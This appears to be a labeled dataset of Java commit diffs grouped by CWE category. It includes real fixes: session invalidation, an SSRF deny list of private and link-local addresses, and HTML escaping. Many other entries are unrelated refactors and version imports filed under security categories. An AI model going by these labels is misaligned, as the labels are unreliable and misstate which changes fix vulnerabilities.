
********************
CWE-287: Improper Authentication (129 samples)
********************
Filename: AuthenticationProcessingFilter2.java
Message: [FIXED SECURITY-75] Invalidate session after login to avoid session fixation

Diff: @@ -85,6 +85,7 @@ public class AuthenticationProcessingFilter2 extends AuthenticationProcessingFil
         // HttpSessionContextIntegrationFilter stores the updated SecurityContext object into this session later
         // (either when a redirect is issued, via its HttpResponseWrapper, or when the execution returns to its
         // doFilter method.
+        request.getSession().invalidate();
         request.getSession();
     }
 

Code after:
		request.getSession().setAttribute("from", whereFrom);
		return excMap.getProperty(failedClassName, getAuthenticationFailureUrl());
    }

    @Override
    protected void onSuccessfulAuthentication(HttpServletRequest request, HttpServletResponse response, Authentication authResult) throws IOException {
        super.onSuccessfulAuthentication(request,response,authResult);
        // make sure we have a session to store this successful authentication, given that we no longer
        // let HttpSessionContextIntegrationFilter2 to create sessions.
        // HttpSessionContextIntegrationFilter stores the updated SecurityContext object into this session later
        // (either when a redirect is issued, via its HttpResponseWrapper, or when the execution returns to its
        // doFilter method.
        request.getSession().invalidate();
        request.getSession();
    }

    /**
     * Leave the information about login failure.
     *
     * <p>
     * Otherwise it seems like Acegi doesn't really leave the detail of the failure anywhere.
     */
    @Override
    protected void onUnsuccessfulAuthentication(HttpServletRequest request, HttpServletResponse response, AuthenticationException failed) throws IOException {
        super.onUnsuccessfulAuthentication(request, response, failed);
        LOGGER.log(Level.INFO, "Login attempt failed", failed);
    }


--------------------
Filename: SamlConfigAttributes.java
Message: KEYCLOAK-19177 Disable ECP flow by default for all Saml clients; ecp flow creates only transient users sessions

Diff: @@ -44,4 +44,5 @@ public interface SamlConfigAttributes {
     String SAML_ENCRYPTION_PRIVATE_KEY_ATTRIBUTE = "saml.encryption." + CertificateInfoHelper.PRIVATE_KEY;
     String SAML_ASSERTION_LIFESPAN = "saml.assertion.lifespan";
     String SAML_ARTIFACT_BINDING_IDENTIFIER = "saml.artifact.binding.identifier";
+    String SAML_ALLOW_ECP_FLOW = "saml.allow.ecp.flow";
 }

Code after:
    String SAML_SERVER_SIGNATURE = "saml.server.signature";
    String SAML_SERVER_SIGNATURE_KEYINFO_EXT = "saml.server.signature.keyinfo.ext";
    String SAML_SERVER_SIGNATURE_KEYINFO_KEY_NAME_TRANSFORMER = "saml.server.signature.keyinfo.xmlSigKeyInfoKeyNameTransformer";
    String SAML_FORCE_POST_BINDING = "saml.force.post.binding";
    String SAML_ASSERTION_SIGNATURE = "saml.assertion.signature";
    String SAML_ENCRYPT = "saml.encrypt";
    String SAML_CLIENT_SIGNATURE_ATTRIBUTE = "saml.client.signature";
    String SAML_SIGNING_CERTIFICATE_ATTRIBUTE = "saml.signing." + CertificateInfoHelper.X509CERTIFICATE;
    String SAML_ENCRYPTION_CERTIFICATE_ATTRIBUTE = "saml.encryption." + CertificateInfoHelper.X509CERTIFICATE;
    String SAML_ENCRYPTION_PRIVATE_KEY_ATTRIBUTE = "saml.encryption." + CertificateInfoHelper.PRIVATE_KEY;
    String SAML_ASSERTION_LIFESPAN = "saml.assertion.lifespan";
    String SAML_ARTIFACT_BINDING_IDENTIFIER = "saml.artifact.binding.identifier";
    String SAML_ALLOW_ECP_FLOW = "saml.allow.ecp.flow";
}


--------------------
Filename: UpstreamPacketHandler.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -80,7 +80,7 @@ public class UpstreamPacketHandler extends LoggingPacketHandler {
         session.setBlockMappings(BlockRegistries.BLOCKS.forVersion(loginPacket.getProtocolVersion()));
         session.setItemMappings(Registries.ITEMS.forVersion(loginPacket.getProtocolVersion()));
 
-        LoginEncryptionUtils.encryptPlayerConnection(connector, session, loginPacket);
+        LoginEncryptionUtils.encryptPlayerConnection(session, loginPacket);
 
         PlayStatusPacket playStatus = new PlayStatusPacket();
         playStatus.setStatus(PlayStatusPacket.Status.LOGIN_SUCCESS);

Code after:
                session.getConnector().getLogger().info(LanguageUtils.getLocaleStringLog("geyser.network.outdated.client", supportedVersions));
                session.disconnect(LanguageUtils.getLocaleStringLog("geyser.network.outdated.client", supportedVersions));
                return true;
            }
        }

        session.getUpstream().getSession().setPacketCodec(packetCodec);

        // Set the block translation based off of version
        session.setBlockMappings(BlockRegistries.BLOCKS.forVersion(loginPacket.getProtocolVersion()));
        session.setItemMappings(Registries.ITEMS.forVersion(loginPacket.getProtocolVersion()));

        LoginEncryptionUtils.encryptPlayerConnection(session, loginPacket);

        PlayStatusPacket playStatus = new PlayStatusPacket();
        playStatus.setStatus(PlayStatusPacket.Status.LOGIN_SUCCESS);
        session.sendUpstreamPacket(playStatus);

        ResourcePacksInfoPacket resourcePacksInfo = new ResourcePacksInfoPacket();
        for(ResourcePack resourcePack : ResourcePack.PACKS.values()) {
            ResourcePackManifest.Header header = resourcePack.getManifest().getHeader();
            resourcePacksInfo.getResourcePackInfos().add(new ResourcePacksInfoPacket.Entry(
                    header.getUuid().toString(), header.getVersionString(), resourcePack.getFile().length(),
                            "", "", "", false, false));
        }
        resourcePacksInfo.setForcedToAccept(GeyserConnector.getInstance().getConfig().isForceResourcePacks());
        session.sendUpstreamPacket(resourcePacksInfo);


--------------------
Filename: PacketTranslator.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -29,6 +29,6 @@ import org.geysermc.connector.network.session.GeyserSession;
 
 public abstract class PacketTranslator<T> {
 
-    public abstract void translate(T packet, GeyserSession session);
+    public abstract void translate(GeyserSession session, T packet);
 
 }

Code after:
 * THE SOFTWARE.
 *
 * @author GeyserMC
 * @link https://github.com/GeyserMC/Geyser
 */

package org.geysermc.connector.network.translators;

import org.geysermc.connector.network.session.GeyserSession;

public abstract class PacketTranslator<T> {

    public abstract void translate(GeyserSession session, T packet);

}


--------------------
Filename: PacketTranslatorRegistry.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -112,7 +112,7 @@ public class PacketTranslatorRegistry<T> {
         }
 
         try {
-            translator.translate(packet, session);
+            translator.translate(session, packet);
         } catch (Throwable ex) {
             GeyserConnector.getInstance().getLogger().error(LanguageUtils.getLocaleStringLog("geyser.network.translator.packet.failed", packet.getClass().getSimpleName()), ex);
             ex.printStackTrace();

Code after:
                }
            }
        }
        return false;
    }

    private <P extends T> void translate0(GeyserSession session, PacketTranslator<P> translator, P packet) {
        if (session.isClosed()) {
            return;
        }

        try {
            translator.translate(session, packet);
        } catch (Throwable ex) {
            GeyserConnector.getInstance().getLogger().error(LanguageUtils.getLocaleStringLog("geyser.network.translator.packet.failed", packet.getClass().getSimpleName()), ex);
            ex.printStackTrace();
        }
    }
}


--------------------
Filename: BedrockAdventureSettingsTranslator.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -38,7 +38,7 @@ import org.geysermc.connector.network.translators.Translator;
 public class BedrockAdventureSettingsTranslator extends PacketTranslator<AdventureSettingsPacket> {
 
     @Override
-    public void translate(AdventureSettingsPacket packet, GeyserSession session) {
+    public void translate(GeyserSession session, AdventureSettingsPacket packet) {
         boolean isFlying = packet.getSettings().contains(AdventureSetting.FLYING);
         if (!isFlying && session.getGameMode() == GameMode.SPECTATOR) {
             // We should always be flying in spectator mode

Code after:
import com.github.steveice10.mc.protocol.packet.ingame.client.player.ClientPlayerAbilitiesPacket;
import com.nukkitx.protocol.bedrock.data.AdventureSetting;
import com.nukkitx.protocol.bedrock.data.entity.EntityFlag;
import com.nukkitx.protocol.bedrock.packet.AdventureSettingsPacket;
import org.geysermc.connector.network.session.GeyserSession;
import org.geysermc.connector.network.translators.PacketTranslator;
import org.geysermc.connector.network.translators.Translator;

@Translator(packet = AdventureSettingsPacket.class)
public class BedrockAdventureSettingsTranslator extends PacketTranslator<AdventureSettingsPacket> {

    @Override
    public void translate(GeyserSession session, AdventureSettingsPacket packet) {
        boolean isFlying = packet.getSettings().contains(AdventureSetting.FLYING);
        if (!isFlying && session.getGameMode() == GameMode.SPECTATOR) {
            // We should always be flying in spectator mode
            session.sendAdventureSettings();
            return;
        }

        session.setFlying(isFlying);
        ClientPlayerAbilitiesPacket abilitiesPacket = new ClientPlayerAbilitiesPacket(isFlying);
        session.sendDownstreamPacket(abilitiesPacket);

        if (isFlying && session.getPlayerEntity().getMetadata().getFlags().getFlag(EntityFlag.SWIMMING)) {
            // Bedrock can fly and swim at the same time? Make sure that can't happen
            session.setSwimming(false);


--------------------
Filename: BedrockAnimateTranslator.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -39,7 +39,7 @@ import java.util.concurrent.TimeUnit;
 public class BedrockAnimateTranslator extends PacketTranslator<AnimatePacket> {
 
     @Override
-    public void translate(AnimatePacket packet, GeyserSession session) {
+    public void translate(GeyserSession session, AnimatePacket packet) {
         // Stop the player sending animations before they have fully spawned into the server
         if (!session.isSpawned()) {
             return;

Code after:
import com.github.steveice10.mc.protocol.packet.ingame.client.world.ClientSteerBoatPacket;
import com.nukkitx.protocol.bedrock.packet.AnimatePacket;
import org.geysermc.connector.network.session.GeyserSession;
import org.geysermc.connector.network.translators.PacketTranslator;
import org.geysermc.connector.network.translators.Translator;

import java.util.concurrent.TimeUnit;

@Translator(packet = AnimatePacket.class)
public class BedrockAnimateTranslator extends PacketTranslator<AnimatePacket> {

    @Override
    public void translate(GeyserSession session, AnimatePacket packet) {
        // Stop the player sending animations before they have fully spawned into the server
        if (!session.isSpawned()) {
            return;
        }

        switch (packet.getAction()) {
            case SWING_ARM:
                // Delay so entity damage can be processed first
                session.scheduleInEventLoop(() ->
                        session.sendDownstreamPacket(new ClientPlayerSwingArmPacket(Hand.MAIN_HAND)),
                        25,
                        TimeUnit.MILLISECONDS
                );
                break;


--------------------
Filename: BedrockBlockEntityDataTranslator.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -39,7 +39,7 @@ import org.geysermc.connector.utils.SignUtils;
 public class BedrockBlockEntityDataTranslator extends PacketTranslator<BlockEntityDataPacket> {
 
     @Override
-    public void translate(BlockEntityDataPacket packet, GeyserSession session) {
+    public void translate(GeyserSession session, BlockEntityDataPacket packet) {
         NbtMap tag = packet.getData();
         if (tag.getString("id").equals("Sign")) {
             // This is the reason why this all works - Bedrock sends packets every time you update the sign, Java only wants the final packet

Code after:
import com.github.steveice10.mc.protocol.packet.ingame.client.world.ClientUpdateSignPacket;
import com.nukkitx.nbt.NbtMap;
import com.nukkitx.protocol.bedrock.packet.BlockEntityDataPacket;
import org.geysermc.connector.network.session.GeyserSession;
import org.geysermc.connector.network.translators.PacketTranslator;
import org.geysermc.connector.network.translators.Translator;
import org.geysermc.connector.utils.SignUtils;

@Translator(packet = BlockEntityDataPacket.class)
public class BedrockBlockEntityDataTranslator extends PacketTranslator<BlockEntityDataPacket> {

    @Override
    public void translate(GeyserSession session, BlockEntityDataPacket packet) {
        NbtMap tag = packet.getData();
        if (tag.getString("id").equals("Sign")) {
            // This is the reason why this all works - Bedrock sends packets every time you update the sign, Java only wants the final packet
            // But Bedrock sends one final packet when you're done editing the sign, which should be equal to the last message since there's no edits
            // So if the latest update does not match the last cached update then it's still being edited
            if (!tag.getString("Text").equals(session.getLastSignMessage())) {
                session.setLastSignMessage(tag.getString("Text"));
                return;
            }
            // Otherwise the two messages are identical and we can get to work deconstructing
            StringBuilder newMessage = new StringBuilder();
            // While Bedrock's sign lines are one string, Java's is an array of each line
            // (Initialized all with empty strings because it complains about null)
            String[] lines = new String[] {"", "", "", ""};


--------------------
Filename: BedrockBlockPickRequestTranslator.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -40,7 +40,7 @@ import org.geysermc.connector.utils.InventoryUtils;
 public class BedrockBlockPickRequestTranslator extends PacketTranslator<BlockPickRequestPacket> {
 
     @Override
-    public void translate(BlockPickRequestPacket packet, GeyserSession session) {
+    public void translate(GeyserSession session, BlockPickRequestPacket packet) {
         Vector3i vector = packet.getBlockPosition();
         int blockToPick = session.getConnector().getWorldManager().getBlockAt(session, vector.getX(), vector.getY(), vector.getZ());
         

Code after:
import org.geysermc.connector.entity.type.EntityType;
import org.geysermc.connector.network.session.GeyserSession;
import org.geysermc.connector.network.translators.PacketTranslator;
import org.geysermc.connector.network.translators.Translator;
import org.geysermc.connector.network.translators.world.block.BlockStateValues;
import org.geysermc.connector.registry.BlockRegistries;
import org.geysermc.connector.utils.InventoryUtils;

@Translator(packet = BlockPickRequestPacket.class)
public class BedrockBlockPickRequestTranslator extends PacketTranslator<BlockPickRequestPacket> {

    @Override
    public void translate(GeyserSession session, BlockPickRequestPacket packet) {
        Vector3i vector = packet.getBlockPosition();
        int blockToPick = session.getConnector().getWorldManager().getBlockAt(session, vector.getX(), vector.getY(), vector.getZ());
        
        // Block is air - chunk caching is probably off
        if (blockToPick == BlockStateValues.JAVA_AIR_ID) {
            // Check for an item frame since the client thinks that's a block when it's an entity in Java
            ItemFrameEntity entity = ItemFrameEntity.getItemFrameEntity(session, packet.getBlockPosition());
            if (entity != null) {
                // Check to see if the item frame has an item in it first
                if (entity.getHeldItem() != null && entity.getHeldItem().getId() != 0) {
                    // Grab the item in the frame
                    InventoryUtils.findOrCreateItem(session, entity.getHeldItem());
                } else {
                    // Grab the frame as the item


--------------------
Filename: BedrockBookEditTranslator.java
Message: Bump version to try and fix deploying; other nitpicks

Diff: @@ -49,7 +49,7 @@ public class BedrockBookEditTranslator extends PacketTranslator<BookEditPacket>
     private static final int MAXIMUM_TITLE_LENGTH = 128 * 4;
 
     @Override
-    public void translate(BookEditPacket packet, GeyserSession session) {
+    public void translate(GeyserSession session, BookEditPacket packet) {
         if (packet.getText() != null && !packet.getText().isEmpty() && packet.getText().getBytes(StandardCharsets.UTF_8).length > MAXIMUM_PAGE_LENGTH) {
             session.getConnector().getLogger().warning("Page length greater than server allowed!");
             return;

Code after:
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;

@Translator(packet = BookEditPacket.class)
public class BedrockBookEditTranslator extends PacketTranslator<BookEditPacket> {
    private static final int MAXIMUM_PAGE_LENGTH = 8192 * 4;
    private static final int MAXIMUM_TITLE_LENGTH = 128 * 4;

    @Override
    public void translate(GeyserSession session, BookEditPacket packet) {
        if (packet.getText() != null && !packet.getText().isEmpty() && packet.getText().getBytes(StandardCharsets.UTF_8).length > MAXIMUM_PAGE_LENGTH) {
            session.getConnector().getLogger().warning("Page length greater than server allowed!");
            return;
        }

        GeyserItemStack itemStack = session.getPlayerInventory().getItemInHand();
        if (itemStack != null) {
            CompoundTag tag = itemStack.getNbt() != null ? itemStack.getNbt() : new CompoundTag("");
            ItemStack bookItem = new ItemStack(itemStack.getJavaId(), itemStack.getAmount(), tag);
            List<Tag> pages = tag.contains("pages") ? new LinkedList<>(((ListTag) tag.get("pages")).getValue()) : new LinkedList<>();

            int page = packet.getPageNumber();
            switch (packet.getAction()) {
                case ADD_PAGE: {


--------------------

********************
CWE-918: Server-Side Request Forgery (SSRF) (73 samples)
********************
Filename: SkinParam.java
Message: Import version 1.2022.5

Diff: @@ -217,7 +217,7 @@ public class SkinParam implements ISkinParam {
 
 	List<String> cleanForKeySlow(String key) {
 		key = StringUtils.trin(StringUtils.goLowerCase(key));
-		key = key.replaceAll("_|\\.|\\s", "");
+		key = key.replaceAll("_|\\.", "");
 		// key = replaceSmart(key, "partition", "package");
 		key = replaceSmart(key, "sequenceparticipant", "participant");
 		key = replaceSmart(key, "sequenceactor", "actor");

Code after:

	List<String> cleanForKey(String key) {
		List<String> result = cacheCleanForKey.get(key);
		if (result == null) {
			result = cleanForKeySlow(key);
			cacheCleanForKey.put(key, result);
		}
		return result;
	}

	List<String> cleanForKeySlow(String key) {
		key = StringUtils.trin(StringUtils.goLowerCase(key));
		key = key.replaceAll("_|\\.", "");
		// key = replaceSmart(key, "partition", "package");
		key = replaceSmart(key, "sequenceparticipant", "participant");
		key = replaceSmart(key, "sequenceactor", "actor");
		key = key.replaceAll("activityarrow", "arrow");
		key = key.replaceAll("objectarrow", "arrow");
		key = key.replaceAll("classarrow", "arrow");
		key = key.replaceAll("componentarrow", "arrow");
		key = key.replaceAll("statearrow", "arrow");
		key = key.replaceAll("usecasearrow", "arrow");
		key = key.replaceAll("sequencearrow", "arrow");
		key = key.replaceAll("align$", "alignment");
		final Matcher2 mm = stereoPattern.matcher(key);
		final List<String> result = new ArrayList<>();
		while (mm.find()) {


--------------------
Filename: CucaDiagramFileMakerElk.java
Message: Import version 1.2022.5

Diff: @@ -258,7 +258,7 @@ public class CucaDiagramFileMakerElk implements CucaDiagramFileMaker {
 			final Style style = Cluster.getDefaultStyleDefinition(umlDiagramType.getStyleName(), group.getUSymbol())
 					.getMergedStyle(skinParam.getCurrentStyleBuilder());
 			final double shadowing = style.value(PName.Shadowing).asDouble();
-			final UStroke stroke = Cluster.getStrokeInternal(group, skinParam, style);
+			final UStroke stroke = Cluster.getStrokeInternal(group, style);
 
 			HColor backColor = getBackColor(umlDiagramType);
 			backColor = Cluster.getBackColor(backColor, skinParam, group.getStereotype(), umlDiagramType.getStyleName(),

Code after:
			final URectangle rect = new URectangle(elkNode.getWidth(), elkNode.getHeight());

			PackageStyle packageStyle = group.getPackageStyle();
			final ISkinParam skinParam = diagram.getSkinParam();
			if (packageStyle == null)
				packageStyle = skinParam.packageStyle();

			final UmlDiagramType umlDiagramType = diagram.getUmlDiagramType();

			final Style style = Cluster.getDefaultStyleDefinition(umlDiagramType.getStyleName(), group.getUSymbol())
					.getMergedStyle(skinParam.getCurrentStyleBuilder());
			final double shadowing = style.value(PName.Shadowing).asDouble();
			final UStroke stroke = Cluster.getStrokeInternal(group, style);

			HColor backColor = getBackColor(umlDiagramType);
			backColor = Cluster.getBackColor(backColor, skinParam, group.getStereotype(), umlDiagramType.getStyleName(),
					group.getUSymbol());

			final double roundCorner = group.getUSymbol() == null ? 0
					: group.getUSymbol().getSkinParameter().getRoundCorner(skinParam, group.getStereotype());

			final TextBlock ztitle = getTitleBlock(group);
			final TextBlock zstereo = TextBlockUtils.empty(0, 0);

			final ClusterDecoration decoration = new ClusterDecoration(packageStyle, group.getUSymbol(), ztitle,
					zstereo, 0, 0, elkNode.getWidth(), elkNode.getHeight(), stroke);



--------------------
Filename: SURL.java
Message: Import version 1.2022.5

Diff: @@ -110,7 +110,7 @@ public class SURL {
 	/**
 	 * Regex to remove the UserInfo part from a URL.
 	 */
-	private static final Pattern PATTERN_USERINFO = Pattern.compile("(^https?://)([-_:0-9a-zA-Z]+@)([^@]*)");
+	private static final Pattern PATTERN_USERINFO = Pattern.compile("(^https?://)([-_0-9a-zA-Z]+@)([^@]*)");
 
 	private static final ExecutorService EXE = Executors.newCachedThreadPool(new ThreadFactory() {
 		public Thread newThread(Runnable r) {

Code after:
 * TODO: Token expiration with refresh should be implemented in future. <br/>
 */
public class SURL {

	/**
	 * Indicates, that we have no authentication to access the URL.
	 */
	public static final String WITHOUT_AUTHENTICATION = SecurityUtils.NO_CREDENTIALS;

	/**
	 * Regex to remove the UserInfo part from a URL.
	 */
	private static final Pattern PATTERN_USERINFO = Pattern.compile("(^https?://)([-_0-9a-zA-Z]+@)([^@]*)");

	private static final ExecutorService EXE = Executors.newCachedThreadPool(new ThreadFactory() {
		public Thread newThread(Runnable r) {
			final Thread t = Executors.defaultThreadFactory().newThread(r);
			t.setDaemon(true);
			return t;
		}
	});

	private static final Map<String, Long> BAD_HOSTS = new ConcurrentHashMap<String, Long>();

	/**
	 * Internal URL, maybe cleaned from user-token.
	 */


--------------------
Filename: CommandStyleMultilinesCSS.java
Message: Import version 1.2022.5

Diff: @@ -37,7 +37,6 @@ package net.sourceforge.plantuml.style;
 
 import net.sourceforge.plantuml.SkinParam;
 import net.sourceforge.plantuml.TitledDiagram;
-import net.sourceforge.plantuml.UseStyle;
 import net.sourceforge.plantuml.command.BlocLines;
 import net.sourceforge.plantuml.command.CommandExecutionResult;
 import net.sourceforge.plantuml.command.CommandMultilines2;

Code after:
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301,
 * USA.
 *
 *
 * Original Author:  Arnaud Roques
 *
 *
 */
package net.sourceforge.plantuml.style;

import net.sourceforge.plantuml.SkinParam;
import net.sourceforge.plantuml.TitledDiagram;
import net.sourceforge.plantuml.command.BlocLines;
import net.sourceforge.plantuml.command.CommandExecutionResult;
import net.sourceforge.plantuml.command.CommandMultilines2;
import net.sourceforge.plantuml.command.MultilinesStrategy;
import net.sourceforge.plantuml.command.regex.IRegex;
import net.sourceforge.plantuml.command.regex.RegexConcat;
import net.sourceforge.plantuml.command.regex.RegexLeaf;

public class CommandStyleMultilinesCSS extends CommandMultilines2<TitledDiagram> {

	public CommandStyleMultilinesCSS() {
		super(getRegexConcat(), MultilinesStrategy.REMOVE_STARTING_QUOTE);
	}

	@Override


--------------------
Filename: Context.java
Message: Import version 1.2022.5

Diff: @@ -83,7 +83,7 @@ class Context {
 			final List<StyleSignatureBasic> tmp = new ArrayList<>();
 			for (StyleSignatureBasic ss : results)
 				for (String name : names)
-					tmp.add(ss.add(name));
+					tmp.add(ss.add(name.trim()));
 			results = tmp;
 		}
 

Code after:
		List<StyleSignatureBasic> results = new ArrayList<>(Collections.singletonList(StyleSignatureBasic.empty()));
		boolean star = false;
		for (Iterator<String> it = data.iterator(); it.hasNext();) {
			String s = it.next();
			if (s.endsWith("*")) {
				star = true;
				s = s.substring(0, s.length() - 1);
			}
			final String[] names = s.split(",");
			final List<StyleSignatureBasic> tmp = new ArrayList<>();
			for (StyleSignatureBasic ss : results)
				for (String name : names)
					tmp.add(ss.add(name.trim()));
			results = tmp;
		}

		if (star)
			for (ListIterator<StyleSignatureBasic> it = results.listIterator(); it.hasNext();) {
				final StyleSignatureBasic tmp = it.next().addStar();
				it.set(tmp);
			}

		return Collections.unmodifiableCollection(results);
	}

}

--------------------
Filename: StyleLoader.java
Message: Import version 1.2022.5

Diff: @@ -164,7 +164,7 @@ public class StyleLoader {
 
 			final Matcher2 mKeyNames = keyName.matcher(trimmed);
 			if (mKeyNames.find()) {
-				String names = mKeyNames.group(1).replace(" ", "");
+				String names = mKeyNames.group(1);
 				final boolean isRecurse = mKeyNames.group(2) != null;
 				if (isRecurse)
 					names += "*";

Code after:

			if (trimmed.startsWith("--")) {
				variables.learn(trimmed);
				continue;
			}

			final int x = trimmed.lastIndexOf("//");
			if (x != -1)
				trimmed = trimmed.substring(0, x).trim();

			final Matcher2 mKeyNames = keyName.matcher(trimmed);
			if (mKeyNames.find()) {
				String names = mKeyNames.group(1);
				final boolean isRecurse = mKeyNames.group(2) != null;
				if (isRecurse)
					names += "*";

				context = context.push(names);
				maps.add(new EnumMap<PName, Value>(PName.class));
				continue;
			}
			final Matcher2 mPropertyAndValue = propertyAndValue.matcher(trimmed);
			if (mPropertyAndValue.find()) {
				final PName key = PName.getFromName(mPropertyAndValue.group(1), scheme);
				final String value = variables.value(mPropertyAndValue.group(2));
				if (key != null && maps.size() > 0)
					maps.get(maps.size() - 1).put(key, //


--------------------
Filename: DecorateEntityImage3.java
Message: Import version 1.2022.5

Diff: @@ -36,7 +36,6 @@
 package net.sourceforge.plantuml.svek;
 
 import net.sourceforge.plantuml.awt.geom.Dimension2D;
-
 import net.sourceforge.plantuml.graphic.AbstractTextBlock;
 import net.sourceforge.plantuml.graphic.StringBounder;
 import net.sourceforge.plantuml.graphic.TextBlock;

Code after:
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301,
 * USA.
 *
 *
 * Original Author:  Arnaud Roques
 *
 * 
 */
package net.sourceforge.plantuml.svek;

import net.sourceforge.plantuml.awt.geom.Dimension2D;
import net.sourceforge.plantuml.graphic.AbstractTextBlock;
import net.sourceforge.plantuml.graphic.StringBounder;
import net.sourceforge.plantuml.graphic.TextBlock;
import net.sourceforge.plantuml.ugraphic.UGraphic;
import net.sourceforge.plantuml.ugraphic.color.HColor;

public class DecorateEntityImage3 extends AbstractTextBlock  implements TextBlockBackcolored {

	private final TextBlock original;
	private final HColor color;

	public DecorateEntityImage3(TextBlock original, HColor color) {
		this.original = original;
		this.color = color;
	}


--------------------
Filename: InnerActivity.java
Message: Import version 1.2022.5

Diff: @@ -36,7 +36,6 @@
 package net.sourceforge.plantuml.svek;
 
 import net.sourceforge.plantuml.awt.geom.Dimension2D;
-
 import net.sourceforge.plantuml.graphic.AbstractTextBlock;
 import net.sourceforge.plantuml.graphic.StringBounder;
 import net.sourceforge.plantuml.ugraphic.UGraphic;

Code after:
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301,
 * USA.
 *
 *
 * Original Author:  Arnaud Roques
 * 
 *
 */
package net.sourceforge.plantuml.svek;

import net.sourceforge.plantuml.awt.geom.Dimension2D;
import net.sourceforge.plantuml.graphic.AbstractTextBlock;
import net.sourceforge.plantuml.graphic.StringBounder;
import net.sourceforge.plantuml.ugraphic.UGraphic;
import net.sourceforge.plantuml.ugraphic.URectangle;
import net.sourceforge.plantuml.ugraphic.UStroke;
import net.sourceforge.plantuml.ugraphic.color.HColor;

public final class InnerActivity extends AbstractTextBlock implements IEntityImage {

	private final IEntityImage im;
	private final HColor borderColor;
	private final double shadowing;
	private final HColor backColor;

	public InnerActivity(final IEntityImage im, HColor borderColor, HColor backColor, double shadowing) {


--------------------
Filename: ProxyServlet.java
Message: Adds isLinkLocalAddress() to address checks

Diff: @@ -254,6 +254,7 @@ public class ProxyServlet extends HttpServlet
 				return (protocol.equals("http") || protocol.equals("https"))
 						&& !address.isAnyLocalAddress()
 						&& !address.isLoopbackAddress()
+						&& !address.isLinkLocalAddress()
 						&& !host.endsWith(".internal") // Redundant
 						&& !host.endsWith(".local") // Redundant
 						&& !host.contains("localhost") // Redundant

Code after:
			try
			{
				URL parsedUrl = new URL(url);
				String protocol = parsedUrl.getProtocol();
				String host = parsedUrl.getHost();
				InetAddress address = InetAddress.getByName(host);
				String hostAddress = address.getHostAddress();
				host = host.toLowerCase();

				return (protocol.equals("http") || protocol.equals("https"))
						&& !address.isAnyLocalAddress()
						&& !address.isLoopbackAddress()
						&& !address.isLinkLocalAddress()
						&& !host.endsWith(".internal") // Redundant
						&& !host.endsWith(".local") // Redundant
						&& !host.contains("localhost") // Redundant
						&& !hostAddress.startsWith("0.") // 0.0.0.0/8 
						&& !hostAddress.startsWith("10.") // 10.0.0.0/8
						&& !hostAddress.startsWith("127.") // 127.0.0.0/8
						&& !hostAddress.startsWith("169.254.") // 169.254.0.0/16
						&& !hostAddress.startsWith("172.16.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.17.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.18.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.19.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.20.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.21.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.22.") // 172.16.0.0/12


--------------------
Filename: ProxyServlet.java
Message: Adds isLinkLocalAddress() to address checks

Diff: @@ -254,6 +254,7 @@ public class ProxyServlet extends HttpServlet
 				return (protocol.equals("http") || protocol.equals("https"))
 						&& !address.isAnyLocalAddress()
 						&& !address.isLoopbackAddress()
+						&& !address.isLinkLocalAddress()
 						&& !host.endsWith(".internal") // Redundant
 						&& !host.endsWith(".local") // Redundant
 						&& !host.contains("localhost") // Redundant

Code after:
			try
			{
				URL parsedUrl = new URL(url);
				String protocol = parsedUrl.getProtocol();
				String host = parsedUrl.getHost();
				InetAddress address = InetAddress.getByName(host);
				String hostAddress = address.getHostAddress();
				host = host.toLowerCase();

				return (protocol.equals("http") || protocol.equals("https"))
						&& !address.isAnyLocalAddress()
						&& !address.isLoopbackAddress()
						&& !address.isLinkLocalAddress()
						&& !host.endsWith(".internal") // Redundant
						&& !host.endsWith(".local") // Redundant
						&& !host.contains("localhost") // Redundant
						&& !hostAddress.startsWith("0.") // 0.0.0.0/8 
						&& !hostAddress.startsWith("10.") // 10.0.0.0/8
						&& !hostAddress.startsWith("127.") // 127.0.0.0/8
						&& !hostAddress.startsWith("169.254.") // 169.254.0.0/16
						&& !hostAddress.startsWith("172.16.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.17.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.18.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.19.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.20.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.21.") // 172.16.0.0/12
						&& !hostAddress.startsWith("172.22.") // 172.16.0.0/12


--------------------

********************
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (58 samples)
********************
Filename: ErrorServlet.java
Message: escape error messages which are supposed be plain text and not markup

Diff: @@ -42,7 +42,7 @@ public class ErrorServlet extends HttpServlet {
          
         // If we are here there was no error servlet, so show the default error page
         String output = Launcher.RESOURCES.getString("WinstoneResponse.ErrorPage",
-                new String[] { sc + "", (msg == null ? "" : msg), sw.toString(),
+                new String[] { sc + "", URIUtil.htmlEscape(msg == null ? "" : msg), URIUtil.htmlEscape(sw.toString()),
                 Launcher.RESOURCES.getString("ServerVersion"),
                         "" + new Date() });
         response.setContentLength(output.getBytes(response.getCharacterEncoding()).length);

Code after:
        
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        if (err != null) {
            err.printStackTrace(pw);
        } else {
            pw.println("(none)");
        }
        pw.flush();
         
        // If we are here there was no error servlet, so show the default error page
        String output = Launcher.RESOURCES.getString("WinstoneResponse.ErrorPage",
                new String[] { sc + "", URIUtil.htmlEscape(msg == null ? "" : msg), URIUtil.htmlEscape(sw.toString()),
                Launcher.RESOURCES.getString("ServerVersion"),
                        "" + new Date() });
